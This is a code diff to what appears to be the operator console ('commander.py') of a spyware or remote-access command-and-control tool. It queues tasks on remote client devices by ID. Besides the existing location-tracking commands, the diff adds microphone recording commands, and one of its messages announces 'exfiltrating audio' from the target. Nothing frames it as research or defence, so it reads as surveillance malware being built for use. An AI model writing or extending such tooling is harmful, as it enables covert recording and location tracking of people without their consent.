@@ -32,6 +32,8 @@ def main():
         print("  python commander.py <ID> location")
         print("  python commander.py <ID> location_start")
         print("  python commander.py <ID> location_stop")
+        print("  python commander.py <ID> record_start")
+        print("  python commander.py <ID> record_stop")
         return
 
     client_id = sys.argv[1]
@@ -58,6 +60,12 @@ def main():
         add_task(client_id, "location_start", {})
     elif command_type == "location_stop":
         add_task(client_id, "location_stop", {})
+    elif command_type == "record_start":
+        add_task(client_id, "record_start", {})
+        print(f"[*] Recording triggered on {client_id}")
+    elif command_type == "record_stop":
+        add_task(client_id, "record_stop", {})
+        print(f"[*] Stopping and exfiltrating audio from {client_id}")
     else:
         print(f"[!] Unknown command type: {command_type}")
 
